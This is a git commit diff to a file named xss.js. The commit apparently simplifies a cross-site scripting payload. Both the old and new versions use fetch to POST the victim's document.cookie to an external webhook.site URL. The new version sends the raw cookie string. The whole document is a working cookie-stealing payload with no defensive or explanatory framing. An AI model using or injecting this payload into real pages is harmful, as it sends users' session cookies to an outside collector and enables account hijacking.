2aabfa7e64fd88bc5adbb2d0ad882c2bd23fa63d
Zoulouh65 <bstrazzera@an21.fr>
2025-05-05 11:52:35 +0200

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,7 +1,4 @@
 fetch("https://webhook.site/807b9d8f-40ce-4758-9119-f2895323714d/receive", {
   method: "POST",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({ cookie: document.cookie })
+  body: document.cookie
 });
